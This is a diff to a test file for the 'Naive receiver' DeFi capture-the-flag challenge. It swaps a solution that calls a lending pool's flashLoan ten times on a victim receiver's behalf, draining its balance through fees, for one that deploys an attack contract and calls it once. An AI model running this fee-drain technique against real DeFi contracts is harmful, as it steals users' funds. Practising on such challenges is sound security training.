@@ -55,11 +55,10 @@ describe("[Challenge] Naive receiver", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
-    // connect as player
-    // call the LenderPool with the FlashloanReviever address 10 times
-    for (var i = 1; i <= 10; i++) {
-      await pool.connect(player).flashLoan(receiver.address, pool.ETH, 0);
-    }
+    const attacker = await (
+      await ethers.getContractFactory("NaiveRecieverAttack", player)
+    ).deploy(pool.address);
+    attacker.flashLoan(receiver.address);
   });
 
   after(async function () {
